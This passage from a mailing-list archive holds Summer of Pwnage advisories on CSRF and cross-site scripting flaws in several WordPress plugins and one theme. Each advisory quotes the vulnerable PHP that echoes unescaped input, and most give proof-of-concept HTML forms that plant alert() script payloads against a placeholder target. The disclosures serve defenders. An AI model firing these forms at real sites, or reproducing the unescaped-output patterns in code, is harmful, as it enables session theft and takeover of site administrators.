			<input type="hidden" name="params[tpl][sub_fields][name][custom]"
value="0" />
			<input type="hidden" name="params[tpl][sub_fields][name][mandatory]"
value="0" />
			<input type="hidden" name="params[tpl][sub_fields][email][name]"
value="email" />
			<input type="hidden" name="params[tpl][sub_fields][email][html]"
value="text" />
			<input type="hidden" name="params[tpl][sub_fields][email][label]"
value="E-Mail" />
			<input type="hidden" name="params[tpl][sub_fields][email][value]"
value="" />
			<input type="hidden" name="params[tpl][sub_fields][email][custom]"
value="0" />
			<input type="hidden" name="params[tpl][sub_fields][email][mandatory]"
value="1" />
			<input type="hidden" name="params[tpl][sub_fields][email][enb]"
value="1" />
			<input type="hidden" name="params[tpl][sub_txt_confirm_sent]"
value="Confirmation link was sent to your email address. Check your
email!" />
			<input type="hidden" name="params[tpl][sub_txt_success]" value="Thank
you for subscribe!" />
			<input type="hidden" name="params[tpl][sub_txt_invalid_email]"
value="Empty or invalid email" />
			<input type="hidden" name="params[tpl][sub_txt_exists_email]"
value="Empty or invalid email" />
			<input type="hidden" name="params[tpl][sub_redirect_url]" value="" />
			<input type="hidden" name="params[tpl][sub_txt_confirm_mail_subject]"
value="Confirm subscription on [sitename]" />
			<input type="hidden" name="params[tpl][sub_txt_confirm_mail_from]"
value="admin@mail.com" />
			<input type="hidden" name="params[tpl][sub_txt_confirm_mail_message]"
value="You subscribed on site <a
href=&quot;[siteurl]&quot;>[sitename]</a>. Follow <a
href=&quot;[confirm_link]&quot;>this link</a> to complete your
subscription. If you did not subscribe here - just ignore this message."
/>
			<input type="hidden"
name="params[tpl][sub_txt_subscriber_mail_subject]" value="[sitename]
Your username and password" />
			<input type="hidden" name="params[tpl][sub_txt_subscriber_mail_from]"
value="admin@mail.com" />
			<input type="hidden"
name="params[tpl][sub_txt_subscriber_mail_message]" value="Username:
[user_login]<br />Password: [password]<br />[login_url]" />
			<input type="hidden" name="params[tpl][sub_redirect_email_exists]"
value="" />
			<input type="hidden" name="params[tpl][sub_btn_label]" value="SIGN
UP" />
			<input type="hidden" name="params[tpl][sub_new_email]"
value="admin&@mail.com" />
			<input type="hidden" name="params[tpl][sub_new_subject]" value="New
Subscriber on Summer of Pwnage" />
			<input type="hidden" name="params[tpl][sub_new_message]" value="You
have new subscriber on your site <a
href=&quot;[siteurl]&quot;>[sitename]</a>, here us subscriber
information:<br />[subscriber_data]" />
			<input type="hidden" name="stat_from_txt" value="" />
			<input type="hidden" name="stat_to_txt" value="" />
			<input type="hidden" name="css" value="" />
			<input type="hidden" name="html" value="<link
rel=&quot;stylesheet&quot; type=&quot;text/css&quot;
href=&quot;//fonts.googleapis.com/css?family=Amatic+SC&quot; />&#10; 
<script>alert(&quot;xss&quot;)</script>&#10;<div
id=&quot;ppsPopupShell_[ID]&quot; class=&quot;ppsPopupShell
ppsPopupListsShell&quot;>&#10;	<a href=&quot;#&quot;
class=&quot;ppsPopupClose
ppsPopupClose_[close_btn]&quot;></a>&#10;&#10;	<div
class=&quot;ppsInnerTblContent&quot;>&#10;		<div
class=&quot;ppsPopupListsInner ppsPopupInner&quot;>&#10;			[if
enb_label]&#10;				<div class=&quot;ppsPopupLabel
ppsPopupListsLabel&quot;>[label]</div>&#10;			[endif]&#10;			<div
style=&quot;clear: both;&quot;></div>&#10;			[if enb_txt_0]&#10;				<div
class=&quot;ppsPopupTxt ppsPopupClassyTxt ppsPopupClassyTxt_0
ppsPopupTxt_0&quot;>&#10;				[txt_0]&#10;				</div>&#10;			[endif]&#10;			[if
enb_subscribe]&#10;				<div
class=&quot;ppsSubscribeShell&quot;>&#10;					[sub_form_start]&#10;					[sub_fields_html]&#10;					<input
type=&quot;submit&quot; name=&quot;submit&quot;
value=&quot;[sub_btn_label]&quot;
/>&#10;					[sub_form_end]&#10;					<div style=&quot;clear:
both;&quot;></div>&#10;				</div>&#10;			[endif]&#10;			<div
style=&quot;clear: both;&quot;></div>&#10;			<div
class=&quot;ppsRightCol&quot;>&#10;				[if enb_sm]&#10;					<div
style=&quot;clear: both;&quot;></div>&#10;					<div
class=&quot;ppsSm&quot;>&#10;					[sm_html]&#10;					</div>&#10;				[endif]&#10;				[if
enb_foot_note]&#10;					<div
class=&quot;ppsFootNote&quot;>&#10;					[foot_note]&#10;					</div>&#10;				[endif]&#10;			</div>&#10;		</div>&#10;	</div>&#10;</div>&#10;"
/>
			<input type="hidden" name="params[opts_attrs][bg_number]" value="2"
/>
			<input type="hidden" name="params[opts_attrs][txt_block_number]"
value="1" />
			<input type="hidden" name="mod" value="popup" />
			<input type="hidden" name="action" value="save" />
			<input type="hidden" name="id" value="100" />
			<input type="hidden" name="params_tpl_txt_val_0" value="<p>Popup by
Supsystic lets you easily create elegant overlapping windows with
unlimited features. Pop-ups with Slider, Lightbox, Contact and
Subscription forms and more</p>" />
			<input type="hidden" name="pl" value="pps" />
			<input type="hidden" name="reqType" value="ajax" />
			<input type="submit"/>
		</form>
	</body>
</html>
------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1]
https://sumofpwn.nl/advisory/2016/popup_by_supsystic_wordpress_plugin_vulnerable_to_cross_site_request_forgery.html
[2] https://wordpress.org/plugins/popup-by-supsystic/
```

</details>

---

</details>
<details>
<summary><strong>[oss-security] Multiple Cross-Site Scripting vulnerabilities affecting various WordPress Plugins</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488379271.2379_82.Morbo,U=38108:2,T -->

##### Summer of Pwnage <lists@securify.nl>, `6a704936-df55-212b-4b2e-594fa1da01a2@securify.nl`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Please see attached advisories for more information. These issues were 
found during Summer of Pwnage (https://sumofpwn.nl), a Dutch community 
project. Its goal is to contribute to the security of popular, widely 
used OSS projects in a fun and educational way.



```

</details>
<details><summary>Additional Parts</summary>

```
------------------------------------------------------------------------
Admin Custom Login WordPress plugin affected by persistent Cross-Site
Scripting via Logo URL field
------------------------------------------------------------------------
Burak Kelebek, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A persistent Cross-Site Scripting vulnerability has been encountered in
the Admin Custom Login WordPress plugin. This issue allows an attacker
to perform a wide variety of actions, such as stealing Administrators'
session tokens, or performing arbitrary actions on their behalf. The
"logo_url" field does not validate <script> tags and does not perform
output encoding. 

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160712-0002

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was succesfully tested on the Admin Custom Login [2]
WordPress plugin version 2.4.5.2.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
There is currently no fix available.

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
Admin custom login plugin give ability to customize your WordPress admin
login page according to you.

Pugin allows to change background color, background image, background
slide show, login form color, login form font size, login form position,
add social media icon on form and many more features.
------------------------------------------------------------------------
Details
------------------------------------------------------------------------
As an admin, it's possible to upload a logo on the login page. The
"logo_url" field does not validate <script> tags and does not perform
output encoding. 

------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------
<html>
	<body>
		<form
action="http://<target>/wp-admin/options-general.php?page=admin_custom_login"
method="POST">
			<input type="hidden" name="Action" value="logoSave"/>
			<input type="hidden" name="logo_image"
value="http://<target>/wp-content/uploads/2016/06/scriptalert1script.jpeg"/>
			<input type="hidden" name="logo_width" value="200"/>
			<input type="hidden" name="logo_height" value="60"/>
			<input type="hidden" name="logo_url"
value="&quot;><script>alert(1)</script>"/>
			<input type="hidden" name="logo_url_title" value="\\\\"/>
			<input type="submit"/>
		</form>
	</body>
</html>


After this request is executed, re-open the admin panel of WordPress and
visit the Admin Custom Login page.

------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] https://sumofpwn.nl/advisory/2016/admin_custom_login_wordpress_plugin_affected_by_persistent_cross_site_scripting_via_logo_url_field.html
[2] https://wordpress.org/plugins/admin-custom-login/
```

</details>
<details><summary>Additional Parts</summary>

```
------------------------------------------------------------------------
Admin Custom Login WordPress plugin custom login page affected by
persistent Cross-Site Scripting
------------------------------------------------------------------------
Burak Kelebek, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A persistent Cross-Site Scripting vulnerability has been encountered in
the Admin Custom Login WordPress plugin. This issue allows an attacker
to perform a wide variety of actions, such as stealing Administrators'
session tokens, or performing arbitrary actions on their behalf. There
is an option in this plugin to add custom style on the login page of
wordpress. If you simply close the </style> tags you are able to put
malicious script which will be executed on the login page.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160712-0003

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was succesfully tested on the Admin Custom Login [2]
WordPress plugin version 2.4.5.2.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
There is currently no fix available.

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
Admin custom login plugin give ability to customize your WordPress admin
login page according to you.

Pugin allows to change background color, background image, background
slide show, login form color, login form font size, login form position,
add social media icon on form and many more features.
------------------------------------------------------------------------
Details
------------------------------------------------------------------------
It is possible as an Admin to put XSS on login page, but more
interesting is the lack of CSRF, so if you can trick a logged-in admin
to open a link with code below XSS will be added to the login page.

------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------
<html>
	<body>
		<form
action="http://<target>/wp-admin/options-general.php?page=admin_custom_login"
method="POST">
			<input type="hidden" name="Action" value="loginbgSave" />
			<input type="hidden" name="login_form_position" value="default" />
			<input type="hidden" name="Login_bg_value" value="undefined" />
			<input type="hidden" name="login_background_color" value="" />
			<input type="hidden" name="login_bg_color_overlay" value="undefined"
/>
			<input type="hidden" name="login_bg_image" value="" />
			<input type="hidden" name="login_form_opacity" value="10" />
			<input type="hidden" name="login_form_width" value="300" />
			<input type="hidden" name="login_form_radius" value="3" />
			<input type="hidden" name="login_border_style" value="undefined" />
			<input type="hidden" name="login_border_thikness" value="3" />
			<input type="hidden" name="login_border_color" value="" />
			<input type="hidden" name="login_bg_repeat" value="undefined" />
			<input type="hidden" name="login_bg_position" value="undefined" />
			<input type="hidden" name="login_enable_shadow" value="no" />
			<input type="hidden" name="login_shadow_color" value="" />
			<input type="hidden" name="login_custom_css"
value="<h1>test</h2></style><script>alert(5)</script>" />
			<input type="hidden" name="login_form_left" value="700" />
			<input type="hidden" name="login_form_top" value="300" />
			<input type="hidden" name="login_form_float" value="center" />
			<input type="submit" value="Submit request" />
		</form>
	</body>
</html>

------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] https://sumofpwn.nl/advisory/2016/admin_custom_login_wordpress_plugin_custom_login_page_affected_by_persistent_cross_site_scripting.html
[2] https://wordpress.org/plugins/admin-custom-login/
```

</details>
<details><summary>Additional Parts</summary>

```
------------------------------------------------------------------------
Cross-Site Request Forgery & Cross-Site Scripting in Contact Form
Manager WordPress Plugin
------------------------------------------------------------------------
Edwin Molenaar [2], July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
 It was discovered that Contact Form Manager does not protect against
Cross-Site Request Forgery. This allows an attacker to change arbitrary
Contact Form Manager settings. In addtion, the plugin also fails to
apply proper output encoding, rendering it vulnerable to stored
Cross-Site Scripting.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160718-0003

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
These issues were successfully tested on Contact Form Manager [3]
WordPress Plugin version 

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
There is currently no fix available.

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
The Contact Form Manager [3] WordPress Plugin lets users create and
manage multiple customized contact forms for their website. It supports
a wide range of contact form elements such as text field, email field,
textarea, dropdown list, radio button, checkbox, date picker, captcha,
and file uploader. It was discovered that Contact Form Manager does not
protect against Cross-Site Request Forgery. This allows an attacker to
change arbitrary Contact Form Manager settings. In addtion, the plugin
also fails to apply proper output encoding, rendering it vulnerable to
stored Cross-Site Scripting.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
These issues exists, because the plugin lacks an anti-CSRF token. Also
improper filtering/output encoding is done on $_POST parameters. These
issues are present in the filed contact-form-manager/admin/add_smtp.php
and contact-form-manager/admin/form-edit.php.

The username input field on the XYZ Contact > SMTP Settings is
vulnerable for Cross-Site Scripting, as wel as the Contact Form Name
input field on the XYZ Contact > Contact Form page.

SMTP Settings URL:
http://<target>/wp-admin/admin.php?page=contact-form-manager-manage-smtp

Contact Forms URL:
http://<target>/wp-admin/admin.php?page=contact-form-manager-managecontactformsp

------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------
<html>
	<body>
		<form id="f1" method="POST"
action="http://<target>/wp-admin/admin.php?page=contact-form-manager-manage-smtp&action=add-smtp">
			<table>
				<tr><td>xyz_cfm_SmtpAuthentication<td><input
name="xyz_cfm_SmtpAuthentication" value="true" size="100"></tr>
				<tr><td>xyz_cfm_SmtpEmailAddress<td><input
name="xyz_cfm_SmtpEmailAddress" value="<svg
onload=alert(document.domain)>" size="100"></tr>
				<tr><td>xyz_cfm_SmtpHostName<td><input name="xyz_cfm_SmtpHostName"
value="<svg onload=alert(document.domain)>" size="100"></tr>
				<tr><td>xyz_cfm_SmtpPassword<td><input name="xyz_cfm_SmtpPassword"
value="<svg onload=alert(document.domain)>" size="100"></tr>
				<tr><td>xyz_cfm_SmtpPortNumber<td><input
name="xyz_cfm_SmtpPortNumber" value="25" size="100"></tr>
				<tr><td>xyz_cfm_SmtpSecuirity<td><input name="xyz_cfm_SmtpSecuirity"
value="notls" size="100"></tr>
			</table>
		</form>
		<button
onclick="document.getElementById('f1').submit()">Submit</button>
	</body>
</html>

------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] https://sumofpwn.nl/advisory/2016/cross_site_request_forgery___cross_site_scripting_in_contact_form_manager_wordpress_plugin.html
[2] https://www.linkedin.com/in/edwinmolenaar
[3] https://wordpress.org/plugins/contact-form-manager/
```

</details>
<details><summary>Additional Parts</summary>

```
------------------------------------------------------------------------
Cross-Site Scripting in Alpine PhotoTile for Instagram WordPress Plugin
------------------------------------------------------------------------
Antonis Manaras, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A Cross-Site Scripting vulnerability was found in the Alpine PhotoTile
for Instagram WordPress Plugin. This issue allows an attacker to perform
a wide variety of actions, such as stealing Administrators' session
tokens, or performing arbitrary actions on their behalf. In order to
exploit this issue, the attacker has to lure/force a logged on WordPress
Administrator into opening a malicious website.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160725-0010

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on Alpine PhotoTile for Instagram [2]
WordPress Plugin version 1.2.7.7.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
There is currently no fix available.

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
Alpine PhotoTile for Instagram [2] is a simple, stylish, and compact
plugin for displaying Instagram photos in a sidebar, post, or page. A
Cross-Site Scripting vulnerability was found in the Alpine PhotoTile for
Instagram WordPress Plugin. This issue allows an attacker to perform a
wide variety of actions, such as stealing Administrators' session
tokens, or performing arbitrary actions on their behalf.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
A reflected Cross-Site Scripting vulnerability exists in the Alpine
Photo Tile for Instagam WordPress plugin. This vulnerability allows an
attacker to perform any action with the privileges of the admin user.
The affected code is not protected with an anti-Cross-Site Request
Forgery token. Consequently, it can be exploited by luring the target
user into clicking a specially crafted link or visiting a malicious
website (or advertisement).

The vulnerability exists in the
alpine-photo-tile-for-instagram/gears/alpinebot-admin.php file on line
887:

	+ '&client_id=<?php echo $_POST['client_id']; ?>'

The vulnerability can be exploited using specially crafted URL
parameter. In order to exploit this issue the target user must click a
specially crafted link or visit a malicious website (or advertisement).

------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------
<html>
	<body>
		<form
action="http://<target>/wp-admin/options-general.php?page=alpine-photo-tile-for-instagram-settings&tab=add"
method="POST">
			<input type="hidden" name="hidden" value="Y" />
			<input type="hidden" name="add&#45;user" value="Y" />
			<input type="hidden" name="client&#95;id"
value="&lt;&#47;script&gt;&lt;img&#32;src&#61;x&#32;onerror&#61;alert&#40;1&#41;&#32;&#47;&gt;"
/>
			<input type="hidden" name="client&#95;secret" value="bar" />
			<input type="hidden"
name="alpine&#45;photo&#45;tile&#45;for&#45;instagram&#45;settings&#95;add&#91;submit&#45;add&#93;"
value="Add&#32;and&#32;Authorize&#32;New&#32;User" />
			<input type="submit" value="Submit request" />
		</form>
	</body>
</html>

------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] https://sumofpwn.nl/advisory/2016/cross_site_scripting_in_alpine_phototile_for_instagram_wordpress_plugin.html
[2] https://wordpress.org/plugins/alpine-photo-tile-for-instagram/
```

</details>
<details><summary>Additional Parts</summary>

```
------------------------------------------------------------------------
Cross-Site Scripting in Atahualpa WordPress Theme
------------------------------------------------------------------------
Spyros Gasteratos, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A number of Cross-Site Scripting vulnerabilities were found in the
Atahualpa WordPress Theme. This issue allows an attacker to perform a
wide variety of actions, such as stealing Administrators' session
tokens, or performing arbitrary actions on their behalf. In order to
exploit this issue, the attacker has to use the CSRF vulnerability
described in SFY20160759 [2] to trick the admin into storing malicious
input.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160724-0004

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on Atahualpa WordPress Theme [3]
WordPress Theme.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
There is currently no fix available.

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
Atahualpa v3.7.24 has it's own theme Options page where administrators
can tweak lots of settings including feed links, comments, website
appearance et cetera. Internally the settings submission is handled by
forms submitting a number of POST requests. However, when the settings
get auto-filled back into the form, input is not escaped in many places,
instead it is returned to the user as plaintext. Atahualpa's settings
allow customisation of various fields such as comments, feed links
etcetera.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
Providing any of the following fields with string such as:
"><script>alert(1);</script> results in the script element getting
appended after the respective input element when the request returns
from the server:

"comment_feed_link",
"home_cat_menu_bar",
"email_subscribe_link",
"home_single_next_prev",
"email_subscribe_link_title",
"feedburner_email_id",
"excerpt_length",
"page_menu_bar_link_color",
"cat_menu_bar_background_color_parent",
"cat_menu_bar_link_color",
"left_col_pages_exclude",
"widget_lists link-hover-color",
"left_col2_cats_exclude"

The solution to this issue is to encode as html all the user-provided
parameters before they are returned to the browser.

------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------
In order to reproduce the issue the following request can be replayed
using the cookies of the current admin.

<html>
	<body>
		<form
action="https://play.sfy.nl/wp-admin/themes.php?page=atahualpa-options"
method="POST">
			<input type="hidden" name="widget_container" value="margin: 0 0 15px
0;"/>
			<input type="hidden" name="widget_title_box" value=""/>
			<input type="hidden" name="widget_title" value="font-size:
1.6em;&#13;font-weight: bold;"/>
			<input type="hidden" name="widget_content" value=""/>
			<input type="hidden" name="widget_lists[li-margin-left]" value="0"/>
			<input type="hidden" name="widget_lists[link-border-left-width]"
value="7"/>
			<input type="hidden" name="widget_lists[link-border-left-color]"
value="CCCCCC"/>
			<input type="hidden"
name="widget_lists[link-border-left-hover-color]" value="000000"/>
			<input type="hidden" name="widget_lists[link-padding-left]"
value="5"/>
			<input type="hidden" name="widget_lists[link-weight]"
value="normal"/>
			<input type="hidden" name="widget_lists[link-color]" value="666666"/>
			<input type="hidden" name="widget_lists[link-hover-color]"
value="000000"/>
			<input type="hidden" name="widget_lists2[li-margin-left]" value="5"/>
			<input type="hidden" name="widget_lists2[link-border-left-width]"
value="7"/>
			<input type="hidden" name="widget_lists2[link-border-left-color]"
value="CCCCCC"/>
			<input type="hidden"
name="widget_lists2[link-border-left-hover-color]" value="000000"/>
			<input type="hidden" name="widget_lists2[link-padding-left]"
value="5"/>
			<input type="hidden" name="widget_lists2[link-weight]"
value="normal"/>
			<input type="hidden" name="widget_lists2[link-color]"
value="666666"/>
			<input type="hidden" name="widget_lists2[link-hover-color]"
value="000000"/>
			<input type="hidden" name="widget_lists3[li-margin-left]" value="5"/>
			<input type="hidden" name="widget_lists3[link-border-left-width]"
value="7"/>
			<input type="hidden" name="widget_lists3[link-border-left-color]"
value="CCCCCCw66ar&quot;><script>alert(1)</script>ljgl1"/>
			<input type="hidden"
name="widget_lists3[link-border-left-hover-color]" value="000000"/>
			<input type="hidden" name="widget_lists3[link-padding-left]"
value="5"/>
			<input type="hidden" name="widget_lists3[link-weight]"
value="normal"/>
			<input type="hidden" name="widget_lists3[link-color]"
value="666666"/>
			<input type="hidden" name="widget_lists3[link-hover-color]"
value="000000"/>
			<input type="hidden" name="category_widget_display_type"
value="inline"/>
			<input type="hidden" name="select_font_size" value="Default"/>
			<input type="hidden" name="save" value=""/>
			<input type="hidden" name="action" value="save"/>
			<input type="hidden" name="category" value="widgets"/>
			<input type="submit"/>
		</form>
	</body>
</html>

------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] https://sumofpwn.nl/advisory/2016/cross_site_scripting_in_atahualpa_wordpress_theme.html
[2] https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_atahualpa_wordpress_theme.html
[3] https://wordpress.org/themes/atahualpa/
```

</details>
<details><summary>Additional Parts</summary>

```
------------------------------------------------------------------------
Cross-Site Scripting in Google Analytics Dashboard WordPress Plugin
------------------------------------------------------------------------
Yorick Koster, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A Cross-Site Scripting vulnerability was found in the Google Analytics
Dashboard WordPress Plugin. This issue allows an attacker to perform a
wide variety of actions, such as stealing Administrators' session
tokens, or performing arbitrary actions on their behalf. In order to
exploit this issue, the attacker has to lure/force a logged on WordPress
Administrator into opening a malicious website.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160724-0026

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on Google Analytics Dashboard [2]
WordPress Plugin version 2.1.1.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
There is currently no fix available.

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
The Google Analytics Dashboard [2] WordPress Plugin gives access to your
Google Analytics data directly inside your WordPress blog. A Cross-Site
Scripting vulnerability was found in the Google Analytics Dashboard
WordPress Plugin. This issue allows an attacker to perform a wide
variety of actions, such as stealing Administrators' session tokens, or
performing arbitrary actions on their behalf.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
This issue exists in the file gad-admin-options-ui.php and is caused due
to the lack of output encoding on the ga_email option/request parameter.

<tr valign="top">
	<th scope="row">
		<label for="ga_email"><?php _e( 'Google Analytics Email',
'google-analytics-dashboard' ); ?></label></th>
	<td>
		<input name="ga_email" type="text" size="15" id="ga_email"
class="regular-text" value="<?php echo isset( $_POST['ga_email'] ) ?
$_POST['ga_email'] : get_option( 'gad_login_email' ); ?>" />
	</td>
</tr>

In order to exploit this issue, the attacker has to lure/force a logged
on WordPress Administrator into opening a malicious website.

------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------
<html>
	<body>
		<form
action="http://<target>/wp-admin/options-general.php?page=google-analytics-dashboard%2Fgad-admin-options.php"
method="POST">
			<input type="hidden" name="gad&#95;login&#95;type" value="client" />
			<input type="hidden" name="ga&#95;email"
value="&quot;><script>alert(1);</script>" />
			<input type="hidden" name="ga&#95;pass" value="password" />
			<input type="hidden" name="ga&#95;save&#95;pass"
value="ga&#95;save&#95;pass" />
			<input type="hidden" name="SubmitLogin" value="Login&#32;?&#187;" />
			<input type="submit" value="Submit request" />
		</form>
	</body>
</html>

------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] https://sumofpwn.nl/advisory/2016/cross_site_scripting_in_google_analytics_dashboard_wordpress_plugin.html
[2] https://wordpress.org/plugins/google-analytics-dashboard/
```

</details>
<details><summary>Additional Parts</summary>

```
------------------------------------------------------------------------
Cross-Site Scripting in Magic Fields 1 WordPress Plugin
------------------------------------------------------------------------
Burak Kelebek, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A reflected Cross-Site Scripting vulnerability has been encountered in
the Magic Fields 1 WordPress plugin. This issue allows an attacker to
perform a wide variety of actions, such as stealing Administrators'
session tokens, or performing arbitrary actions on their behalf.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160724-0019

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on Magic Fields 1 [2] version 1.7.1.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
This issue is addressed in the 1.7.2 [3] version of Magic Fields 1. You
can obtain the most recent version on the following location:
https://github.com/hunk/Magic-Fields/releases [4]

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
Magic Fields is a WordPress plugin that allows for easy creation of
custom fields in various post types in a WordPress post. A reflected
Cross-Site Scripting vulnerability was found in Magic Fields that allows
an attacker to perform a wide variety of actions, such as stealing
administrators' session tokens, or performing arbitrary actions on their
behalf. To exploit this issue an attacker needs to lure a user with
administrator privileges to a page controlled by the attacker or trick
him into clicking a malicious link.
                                                                        
                                                                        
                                                                        
                                                       
[h3]Details[/h3]                                                        
                                                                        
                                                                        
                                                       
Cross-Site Scripting (XSS) attacks are a type of injection, in which
malicious scripts are injected into otherwise benign and trusted
websites. XSS attacks occur when an attacker uses a web application to
send malicious code, generally in the form of a browser script, to a
different end user. Flaws that allow these attacks to succeed are quite
widespread and occur when a web application uses input from a user
without validating or encoding it. Reflected XSS occurs when user input
is immediately returned by a web application in an error message, search
result, or any other response that includes some or all of the input
provided by the user as part of the request.
 
The plugin has several instances where XSS is possible due to lacking
output encoding and user input sanitization:
1. The custom-write-panel-id field does not validate <script> tags and
does not perform output encoding. Proof of concept code that
demonstrates this issue is listed in the proof of concept section.
2. The value of the custom-group-id parameter in the
RCCWP_CreateCustomFieldPage.php file is insufficiently validated:
53: echo $_GET['custom-group-id'];3. The value of the custom-field-css
parameter in the RCCWP_CreateCustomFieldPage.php file is insufficiently
validated:
53: echo $_POST['custom-field-css'];

------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------
Proof of concept code that demonstrates the Cross-Site Scripting in the
custom-write-panel-id field is listed below: 
http://<targetsite>/wp-admin/admin.php?page=MagicFieldsMenu&custom-write-panel-id=1"
/><script>alert(1)</script>&mf_action=finish-create-custom-field

------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] https://sumofpwn.nl/advisory/2016/cross_site_scripting_in_magic_fields_1_wordpress_plugin.html
[2] http://magicfields.org/
[3] https://github.com/hunk/Magic-Fields/releases/tag/1.7.2
[4] https://github.com/hunk/Magic-Fields/releases
```

</details>
<details><summary>Additional Parts</summary>

```
------------------------------------------------------------------------
Cross-Site Scripting vulnerability in Gwolle Guestbook WordPress Plugin
------------------------------------------------------------------------
Radjnies Bhansingh, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A Cross-Site Scripting vulnerability was found in the Gwolle Guestbook
[2] WordPress plugin. This issue allows an attacker to perform a wide
variety of actions, such as stealing Administrators' session tokens, or
performing arbitrary actions on their behalf. In order to exploit this
issue, the attacker has to lure a WordPress user with editor or
administrator privileges into opening a malicious website. 

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160712-0033

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was succesfully tested on the Gwolle Guestbook [2] WordPress
Plugin version 1.7.4.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
This issue was fixed in Gwolle Guestbook version version 2.1.1. The most
recent version of Gwolle Guestbook can be obtained from the following
location:
https://wordpress.org/plugins/gwolle-gb/ [2]

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
Gwolle Guestbook for WordPress is a guestbook made in order to provide
an easy and slim way to integrate a guestbook into your WordPress
powered site. Don't use your 'comment' section the wrong way - install
Gwolle Guestbook and have a real guestbook.

A Cross-Site Scripting vulnerability was found in Gwolle Guestbook. This
issue allows an attacker to perform a wide variety of actions, such as
stealing Administrators' session tokens, or performing arbitrary actions
on their behalf. 

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
This issue can be exploited by an anonymous attacker that sends a
Cross-Site Scripting payload via one of the input fields of the
guestbook. These fields are visible in the guestbook entries tab.
Whenever an editor or administrator reviews the entry the payload is
executed. 

An example of this vulnerability exists in the
/gwolle-gb/admin/page-editor.php file on line 434:
<input type="text" name="gwolle_gb_author_origin" tabindex="3"
class="wp-exclude-emoji" placeholder="<?php _e('City', 'gwolle-gb'); ?>"
value="<?php echo gw    olle_gb_sanitize_output(
$entry->get_author_origin() ); ?>" id="author_origin" />

------------------------------------------------------------------------
Proof of Concept
------------------------------------------------------------------------
A proof of concept attack is listed below:

<html>
	<body>
		<form action="https://<target>/" method="POST">
			<input type="hidden" name="gwolle_gb_function" value="add_entry"/>
			<input type="hidden" name="gwolle_gb_book_id" value="1"/>
			<input type="hidden" name="gwolle_gb_author_name" value="John"/>
			<input type="hidden" name="gwolle_gb_author_origin"
value="amsterdam&quot; onmouseover=alert(1) a=&quot;"/>
			<input type="hidden" name="gwolle_gb_author_email"
value="john&#64;d&#46;oe"/>
			<input type="hidden" name="gwolle_gb_author_website" value=""/>
			<input type="hidden" name="gwolle_gb_subject" value=""/>
			<input type="hidden" name="gwolle_gb_content"
value="hi&#44;&#32;cool"/>
			<input type="hidden" name="gwolle_gb_wpnonce" value="<valid nonce>"/>
			<input type="hidden" name="gwolle_gb_submit" value="Submit"/>
			<input type="submit"/>
		</form>
	</body>
</html>


A victim editor or administrator then needs to open the following view
page:
http://<target>/wp-admin/admin.php?page=gwolle-gb/editor.php&entry_id=13

